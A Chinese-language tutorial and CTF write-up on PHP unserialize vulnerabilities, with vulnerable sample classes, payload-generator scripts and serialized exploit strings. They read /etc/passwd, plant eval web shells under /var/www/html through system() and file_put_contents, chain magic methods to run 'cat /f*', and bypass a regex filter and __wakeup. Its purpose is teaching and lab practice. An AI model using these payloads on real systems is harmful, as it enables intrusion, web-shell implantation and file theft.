# php 反序列化

序列化是指将 PHP 中的数据结构（例如**数组**或**对象**的属性）转换成一个字符串的过程。

反序列化是序列化的逆过程，它将之前通过 `serialize()` 函数生成的字符串转换回原来的 PHP 数据结构（如数组或对象）。



反序列化漏洞是指，PHP程序可用通过HTTP传输（或其他方法）接受一个字符串，并且将字符串反序列化为一个对象。可用通过构造特殊的字符串，PHP程序将此字符串反序列化为一个对象后，控制这个对象的属性值，以达到控制程序执行的目的。



## 示例 1

假设存在以下PHP代码，它通过POST请求接受一个名为name的字符串变量，并将直接字符串反序列化为一个对象。

通过分析printData()方法的代码，得知只需要将User的isAdmin设置为true，就会打印出Password。

```php
<?php

class User {

    public $username;
    public $isAdmin;

    public function PrintData() {
        if ($this->isAdmin == true) {
            echo $this->username . " is an admin\n";
            echo "Password is xxxxxxxxx\n";
        }
        else {
            echo $this->username . " is not an admin\n";
        }
    }

}

$obj = unserialize($_POST['name']);

if (is_object($obj))   
    $obj->printData();
                      
?>
```



创建一个PHP文件（命名为hack.php），在文件中定义一个User类，并初始化username和isAdmin的值，在序列化这个类的对象。

```php
<?php

class User {

    public function __construct() {
        $this->username = "test";
        $this->isAdmin = true;
    }

}

echo serialize(new User) . "\n";
```



使用php执行hack.php（**php hack.php**），会输出User的序列化结果。

```
O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:1;}
```



发送POST请求，name变量的值设置为该字符串。

注意：为了PHP能正常解析参数必须加上

```
Content-Type: application/x-www-form-urlencoded
```

![image-20241011095127801](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011095127801.png)

注意：即使name变量是一个字符串，**也不要加上单引号或双引号**

如果添加了双引号，会成为name字符串的一部分，在反序列化解析的时候会出错。

错误：

```
name="O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:1;}"
```

正确：

```
name=O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:1;}
```



isAdmin 的值是 bool 类型，其值为 true ，在序列化后的字符串中为 s:7:"isAdmin";b:1; 

将 b 中的 1 改为 0 ，则反序列化后的对象属性中isAdmin的值为false

![image-20241011102807690](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011102807690.png)



## 示例 2

现在PHP代码中有一个ReadFile类，该类有一个魔术方法，当尝试将该类所实例化的对象当成一个字符串使用的时候，就会调用__tostring 方法。

该方法会使用读取对象属性filename所指定的文件。

```php
<?php

class ReadFile {

    public function __tostring() {
        return file_get_contents($this->filename);
    }

}

class User {

    public $username;
    public $isAdmin;
    
    public function PrintData() {
        if ($this->isAdmin == true) {
            echo $this->username . " is an admin\n";
            echo "Password is xxxxxxxxx\n";
        }
        else {
            echo $this->username . " is not an admin\n";
        }
    }

}

$obj = unserialize($_POST['name']);

if (is_object($obj))
    $obj->printData();

?>

```



构建反序列化字符串。

添加了ReadFile类，将其filename属性的值，设置为要读取的文件路径。

将User类实例化对象的username属性的值，设置为实例化的ReadFile类的实例化对象。

```php
<?php

class ReadFile { 

    public function __construct() {
        $this->filename = "/etc/passwd";
    }
}

class User {

    public function __construct() {
        $this->username = new ReadFile;
        $this->isAdmin = true;
    }

}

echo serialize(new User) . "\n";
```



使用POST请求，将反序列字符串通过name变量传输。

![image-20241011105021915](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011105021915.png)



## 示例 3

在原有的文件中，引入了一个logging.php，这个php文件中定义了一个LogFile对象，这个对象有一个析构函数，在对象销毁时会将username属性的值，写入filename属性值所指定的路径中。

```php
// logging.php
<?php

class LogFile {
	public function __destruct() {
		file_put_contents($this->filename,$this->username,FILE_APPEND);
	}
}

?>
    
// serialize.php
<?php

include "logging.php";

class ReadFile {

    public function __tostring() {
        return file_get_contents($this->filename);
    }

}

class User {

    public $username;
    public $isAdmin;
    
    public function PrintData() {
        if ($this->isAdmin == true) {
            echo $this->username . " is an admin\n";
            echo "Password is xxxxxxxxx\n";
        }
        else {
            echo $this->username . " is not an admin\n";
        }
    }

}

$obj = unserialize($_POST['name']);

if (is_object($obj))
    $obj->printData();

?>
```



构建反序列化字符串

创建了一个LogFile类，并设置filename和username属性的值。

此时不再将LogFile类的实例化对象赋值给username属性，因为会通过 echo 输出 username属性中的值，如果username属性的类型时对象，则在echo输出时会报错，所以赋值给isAdmin。

```php
<?php

class LogFile {

    public function __construct() {
	$this->filename = "/var/www/html/php7.4/a.php";
	$this->username = "<?php \$_GET['cmd']; ?>";
    }

}

class User {

    public function __construct() {
        $this->username = "test";
        $this->isAdmin = new LogFile;
    }

}

echo serialize(new User) . "\n";
?>
```

![image-20241011112447586](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011112447586.png)

文件上传成功

![image-20241011112508462](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011112508462.png)



## 示例4

在此示例中，虽然pwned本身没有析构函数，但是ReadFile类中的析构函数，会调用一个对象的pwn方法。

此时可用将 ReadFile 类的 secret 属性赋值为 pwned 类的实例化对象，并且command属性的值为要执行的命令。

将User类的isAdmin属性赋值为ReadFile的实例化对象。

```php
<?php


class pwned {
    public function pwn() {
	system($this->command);
    }
}

class ReadFile {

    public function __tostring() {
        return file_get_contents($this->filename);
    }

    public function __destruct() {
	$this->secret->pwn();
    }

}

class User {

    public $username;
    public $isAdmin;
    
    public function PrintData() {
        if ($this->isAdmin == true) {
            echo $this->username . " is an admin\n";
            echo "Password is xxxxxxxxx\n";
        }
        else {
            echo $this->username . " is not an admin\n";
        }
    }

}

$obj = unserialize($_POST['name']);

if (is_object($obj))
    $obj->printData();

?>
```



构造反序列化字符串

```php
<?php

class pwned {
    public function __construct() {
	$this->command = "echo '<?php @eval($_GET[cmd]) ?>' > /var/www/html/php7.4/a.php ";
    }
}

class ReadFile { 

    public function __construct() {
        $this->secret = new pwned;
    }
}

class User {

    public function __construct() {
        $this->username = "test";
        $this->isAdmin = new ReadFile;
    }

}

echo serialize(new User) . "\n";
```



文件上传成功

![image-20241011125252792](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011125252792.png)

![image-20241011125303437](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011125303437.png)



注意：shell 会将双引号字符串中的以$开头的单词解析成变量。

例如：shell 会将下面字符串中的 $_GET 当成变量进行解析

```
echo "<?php @eval($_GET['cmd']) ?> " > hack.php
```

由于 $_GET 变量不存在，会被解析为空字符串，最后 hack.php 中的内容为：

```
<?php @eval(['cmd']) ?>
```



方法为：将包含字符串的双引号替换为单引号

```
<?php @eval($_GET[cmd]) ?>
```



# CTF

## [SWPUCTF 2022 新生赛]1z_unserialize

知识：可变函数

如果一个**变量名后有圆括号**，PHP 将寻找**与变量的值同名的函数**，并且尝试执行它。



在这个示例中，$a（也就是 lyh 的 lt 属性）为要调用的函数名称，lyh 的 lly 属性为传递给函数的参数。

```php
<?php
 
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;

        $a($this->lly);
     }
    
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
 
 
?> 
```



调用system函数执行系统命令，使用echo命令将一句话木马写入 /var/www/html/a.php 文件中。

```php
<?php

class lyh {

	public $lt = "system";
	public $lly = "echo '<?php @eval(\$_POST[\"bash\"]); ?>' > /var/www/html/a.php";

}

echo serialize(new lyh);

?>
```



反序列化字符串

```
O:3:"lyh":2:{s:2:"lt";s:6:"system";s:3:"lly";s:60:"echo '<?php @eval($_POST["bash"]); ?>' > /var/www/html/a.php";}
```



发送POST请求，进行反序列化

![image-20241011130959045](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011130959045.png)



利用上传的a.php文件中的一句话木马

![image-20241011131238399](./images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20241011131238399.png)



## [NISACTF 2022]babyserialize

解题思路：

1. 寻找可用 eval 等可用执行命令，获取flag的命令

发现 eval 在 NISA 类的 `__invoke` 魔术方法中，当尝试以调用函数的方式调用一个对象时，`__invoke()` 方法会被自动调用。

```php
$obj = new CallableClass;
$obj(5);
```

eval 接受 NISA 类的 txw4ever属性，注意 fun 的值不能为 show_me_flag。

```php
$nisa = new NISA;
$nisa->fun = "test";
$nisa->txw4ever = "SYSTEM(\"cat /f*\")";
```



2. 寻找类似于 `$functionName($args)` 的代码。

发现在 Ilovetxw 类的 __tostring 魔术方法中，当尝试将类转换为一个字符串是会调用该对象。

```php
$bb = $this->su;
return $bb();
```

Ilovetxw 类 __tostring 调用 su 属性存储的可变函数。

```php
$love = new Ilovetxw;
$love->su = $nisa;
```



3. 寻找会使用字符串的函数

发现在 four 的 __set 函数中 strtolower 接受一个字符串参数，在给不可访问（protected 或 private）或不存在的属性赋值时，`__set()` 会被调用。

four 类将 a 属性交给 strtolower 函数。

```php
$four = new four;
$four->a = $love;
```



4. 寻找会访问私有变量的函数

four 有一个私有变量 fun ，Ilovetxw 类中有个 __call 函数 会使用  fun。在对象中调用一个不可访问方法时，`__call()` 会被调用。

```php
$love->huang = $four;
```



5. 寻找会调用对象方法的函数

TianXiWei 类中的 __wakeup 会使用 nisa ，且 four 中没有 nisa 方法。`__wakeup ` 会在反序列化时自动被调用。

```php
$tian = new TianXiWei;
$tian->ext = $love;
```



```php
<?php
include "waf.php";
class NISA{
    public $fun="show_me_flag";
    public $txw4ever;
    public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }

    function __call($from,$val){
        $this->fun=$val[0];
    }

    public function __toString()
    {
        echo $this->fun;
        return " ";
    }
    public function __invoke()
    {
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);
    }
}

class TianXiWei{
    public $ext;
    public $x;
    public function __wakeup()
    {
        $this->ext->nisa($this->x);
    }
}

class Ilovetxw{
    public $huang;
    public $su;

    public function __call($fun1,$arg){
        $this->huang->fun=$arg[0];
    }

    public function __toString(){
        $bb = $this->su;
        return $bb();
    }
}

class four{
    public $a="TXW4EVER";
    private $fun='abc';

    public function __set($name, $value)
    {
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){
            strtolower($this->a);
        }
    }
}

if(isset($_GET['ser'])){
    @unserialize($_GET['ser']);
}else{
    highlight_file(__FILE__);
}

//func checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
//}

//function hint(){
//    echo ".......";
//    die();
//}
?>
```



构造反序列化字符串

```php
$nisa = new NISA;
$nisa->txw4ever = "SYSTEM(\"cat /f*\");";
$nisa->fun = "test";
$love = new Ilovetxw;
$love->su = $nisa;
$four = new four;
$four->a = $love;
$love->huang = $four;
$tian = new TianXiWei;
$tian->ext = $love;

echo serialize($tian);
```



更简单的方法，__wakeup 模仿方法中，有一个 if($this->fun=="show_me_flag") 若比较，如果 $this-fun 为一个对象，将会调用这个对象那个的`__tostring` 魔法函数。

构造反序列化字符串

```php
$nisa = new NISA;
$nisa->txw4ever = "SYSTEM(\"cat /f*\");";

$love = new Ilovetxw;
$love->su = $nisa;

$nisa->fun = $love;

echo serialize($nisa);
```



## Web_php_unserialize【攻防世界】

正则表达式绕过：`preg_match('/[oc]:\d+:/i', $var)`

该正则表达式会匹配 c:123 0:32 o:234 等形式的子字符串，但是可以在描述**对象名称长度**的**数字前面加上+符号**，能绕过正则表达式，还能被**正常的反序列化**。

```
O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
```

可以改为：

```
O:+4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
```



__wakeup 函数是魔术用法会在对象反序列化时自动执行。

PHP5 < 5.6.25， PHP7 < 7.0.10 的版本存在wakeup的漏洞。

当要被反序列化的字符串中，描述的对象属性的个数，与php中对象**属性的数量不同时**，__wakup**不会被执行**。

```
O:+4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
```

替换为

```
O:+4:"Demo":2:{s:10:" Demo file";s:8:"fl4g.php";}
```



私有属性会在属性名称的开始和末尾添加"%00"，当前php程序也会对字符串进行base64解码，为了防止在复制字符串的时候漏掉"%00"，在构建php字符串后，进行base64编码后在输出。



```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```



payload：

```php
<?php
class Demo {
    private $file = 'fl4g.php';
}

$str = serialize(new Demo());
$str = str_replace("O:4","O:+4",$str );
$str = str_replace("1:","2:",$str );
echo base64_encode($str);
?>

// TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
```

